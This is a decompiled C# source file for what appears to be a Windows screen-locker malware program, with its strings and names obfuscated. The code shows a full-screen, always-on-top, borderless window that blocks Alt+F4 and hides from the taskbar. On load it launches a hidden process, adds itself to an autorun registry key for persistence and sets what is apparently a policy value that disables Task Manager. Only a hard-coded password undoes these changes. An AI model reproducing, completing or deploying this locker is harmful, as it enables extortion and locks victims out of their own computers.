using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

public class GForm0 : Form
{
	private IContainer icontainer_0;

	private Button button_0;

	private TextBox textBox_0;

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		button_0 = new Button();
		textBox_0 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)button_0).set_Anchor((AnchorStyles)2);
		((Control)button_0).set_Location(new Point(326, 527));
		((Control)button_0).set_Name(GClass0.smethod_0("eųɱͰѬլذ"));
		((Control)button_0).set_Size(new Size(124, 36));
		((Control)button_0).set_TabIndex(0);
		((Control)button_0).set_Text(GClass0.smethod_0("ЮԽػ\u073a1ķȲ\u033f\u0c46\u0d3b\u0e36༳ࡀ\u094d"));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(true);
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		((Control)textBox_0).set_Anchor((AnchorStyles)2);
		((Control)textBox_0).set_Location(new Point(326, 501));
		((Control)textBox_0).set_Name(GClass0.smethod_0("|Ţɾͱцլٺ\u0730"));
		((Control)textBox_0).set_Size(new Size(124, 20));
		((Control)textBox_0).set_TabIndex(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject(GClass0.smethod_0("1ŠɻͻѢԾ\u064dݯ\u086e१੬\u0b78౦ൽ\u0e69ར၌ᅩቢ፥ᑤ")));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(800, 600));
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass0.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(GClass0.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public GForm0()
	{
		method_0();
		((Form)this).set_KeyPreview(true);
	}

	protected override void OnKeyDown(KeyEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Invalid comparison between Unknown and I4
		((Control)this).OnKeyDown(e);
		if ((int)e.get_KeyCode() == 115 && e.get_Alt())
		{
			e.set_Handled(true);
		}
	}

	public static string smethod_0(string string_0)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(string_0);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			throw new Exception(GClass0.smethod_0("PŦɡͽѣ\u0530٦ݠ\u082d८੪\u0b79౬\u0d3eำག\u1060ᅧቬ፦ᑤ") + ex.Message);
		}
	}

	public static string smethod_1(int int_0)
	{
		string result = GClass0.smethod_0("");
		if (int_0 == 1)
		{
			result = smethod_0(GClass0.smethod_0("oĸɐͼѩՀؿݿࡠ\u0942\u0a3f\u0b3c"));
		}
		if (int_0 == 2)
		{
			result = smethod_0(GClass0.smethod_0("VŦɮͰђՐ\u0650ݨࡦ।\u0a3f\u0b3c"));
		}
		if (int_0 == 3)
		{
			result = smethod_0(GClass0.smethod_0("IĩȣʹѼ՟ٲݽ\u0877ॾ\u0a44୲\u0c48\u0d4a฿\u0f7dၕᄸቀ\u137fᑫᔵᘿᝨᡠ᥅\u1a7a᭢"));
		}
		if (int_0 == 4)
		{
			result = smethod_0(GClass0.smethod_0("tŭɒͱщհ\u0613ݎࡆऐ\u0a46\u0b5b౸൙\u0e66ཙၸᅃቐ፠ᑂᕀᘣᜥᡂ\u197eᩄ᭨ᱳᴽṢύ\u206eⅧ≲⍪\u245d╩♐❰⡜⥅⩵⬼"));
		}
		if (int_0 == 5)
		{
			result = smethod_0(GClass0.smethod_0("hŌɌͳѩԵٲݵࡦ\u0944\u0a75\u0b3c"));
		}
		if (int_0 == 6)
		{
			result = smethod_0(GClass0.smethod_0("UĹȻ\u0362фժ\u0650\u0731࡞\u0952\u0a3f\u0b3c"));
		}
		if (int_0 == 7)
		{
			result = smethod_0(GClass0.smethod_0("Hĳɏ\u0366"));
		}
		if (int_0 == 8)
		{
			result = smethod_0(GClass0.smethod_0("UŘȣʹёՔدݥ\u0876\u0940\u0a50\u0b7d\u0c75\u0d47\u0e4c\u0f7eၮᄸቀ፥ᑫᕮᘳᝩᡡ᥄\u1a57\u1b3c"));
		}
		return result;
	}

	public static void smethod_2()
	{
		Application.Exit();
	}

	public static void smethod_3()
	{
		string value = GClass0.smethod_0("0");
		string text = GClass0.smethod_0("Eźɲ\u0367ѥհ٢ݪࡒ\u0940\u0a65୨౸൦\u0e7bཨ\u1060ᅱቘፔᑫᕯ");
		string subkey = text + GClass0.smethod_0("Gōɖ\u0353у՝٨ݮࡩॿ\u0a77୬\u0c41൳\u0e67ཧၺᅽቿፌᑟᕡᙡᝥᡨᥣ\u1a6c᭻ᱛᵕṼί⁷Ⅷ≬");
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue(GClass0.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), value);
			registryKey.Close();
		}
		catch (Exception)
		{
			if (34 > Screen.get_PrimaryScreen().get_Bounds().Width)
			{
				smethod_2();
			}
		}
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		string text = smethod_1(5);
		Process.Start(smethod_1(6), smethod_1(7) + text + smethod_1(8));
		string name = smethod_1(1);
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(smethod_1(3) + smethod_1(4));
		try
		{
			if (Screen.get_PrimaryScreen().get_Bounds().Width > 58)
			{
				registryKey.SetValue(name, executablePath);
				registryKey.Close();
			}
		}
		catch
		{
			if (Control.get_DefaultBackColor().ToString() == smethod_1(2))
			{
				MessageBox.Show(GClass0.smethod_0("@Ŷɱ\u036dѳ"));
			}
		}
		smethod_3();
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		if (!(((Control)textBox_0).get_Text() == GClass0.smethod_0("oŭɭ")))
		{
			return;
		}
		if (Screen.get_PrimaryScreen().get_Bounds().Width > 58)
		{
			Process.Start(GClass0.smethod_0("TĬɉ\u0343Ѻռٵݿ\u0878ॽ\u0a51୩\u0c73ൺ\u0e65ཧၵᅣቷጪᑦᕺᙤ"));
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GClass0.smethod_0("}łɊ\u035fѝՈ\u065a\u0742\u087a२\u0a4d\u0b40\u0c50ൎ๓\u0f70ၸᅩቀፌᑳᕷᙼ\u1778ᡡᥦᩈ᭐ᱧᵣṢὪ\u2060ⅹ≚⍮⑸╺♡❨⡨⥙⩖⭶ⱬⵝ"));
			try
			{
				string text = GClass0.smethod_0("mŪɮ");
				registryKey.DeleteValue(GClass0.smethod_0("qŷ") + text + GClass0.smethod_0("qŵ"));
				registryKey.Close();
			}
			catch
			{
			}
			string text2 = GClass0.smethod_0("`űɳ\u0362Ѱդ");
			int num = 5;
			string subkey = GClass0.smethod_0("QŮ") + text2 + GClass0.smethod_0("mŽɆ\u034dџՃ\u0658\u0745ࡏड़\u0a7bୱ\u0c4c\u0d4a\u0e47ཌྷ\u1056ᅓቃ\u135dᑨᕮᙩ\u177fᡷᥬᩁ\u1b73ᱧᵧṺώⁿ⅌≟⍡②╥♨❣⡬⥻⩛⭕ⱼ\u2d77\u2e77⽧ぬ");
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey2.SetValue(GClass0.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), (num - 5).ToString());
				registryKey2.Close();
			}
			catch (Exception)
			{
			}
		}
		Application.Exit();
	}
}
